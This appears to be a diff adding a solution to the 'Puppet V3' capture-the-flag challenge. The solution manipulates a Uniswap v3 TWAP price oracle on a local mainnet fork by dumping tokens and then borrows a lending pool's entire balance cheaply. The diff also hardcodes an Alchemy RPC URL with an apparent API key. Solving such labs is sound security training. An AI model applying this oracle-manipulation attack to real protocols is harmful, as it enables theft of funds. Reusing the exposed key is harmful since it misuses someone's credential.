@@ -3,6 +3,7 @@ const { expect } = require('chai');
 const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers");
 
 const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
+const routerJson = require("@uniswap/v3-periphery/artifacts/contracts/SwapRouter.sol/SwapRouter.json");
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
 const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
 
@@ -26,7 +27,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://eth-mainnet.g.alchemy.com/v2/lzhv9TCME4EqM4y39RPnBGviYu9A97Qi";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -40,7 +41,6 @@ describe('[Challenge] Puppet v3', function () {
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-
         // Fork from mainnet state
         await ethers.provider.send("hardhat_reset", [{
             forking: { jsonRpcUrl: MAINNET_FORKING_URL, blockNumber: 15450164 }
@@ -138,8 +138,30 @@ describe('[Challenge] Puppet v3', function () {
         initialBlockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
     });
 
-    it('Execution', async function () {
+    it('Execution Puppet V3', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const swapRouter = new ethers.Contract("0xe592427a0aece92de3edee1f18e0157c05861564", routerJson.abi, player);
+
+        await token.connect(player).approve(swapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        await swapRouter.exactInputSingle(
+            [token.address,
+            weth.address,   
+            3000,
+            player.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0,
+            0],
+            { gasLimit: 5000000 }
+        );
+
+        await time.increase(110);
+        const amountToTransfer = await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        await weth.connect(player).approve(lendingPool.address, amountToTransfer);
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
     });
 
     after(async function () {
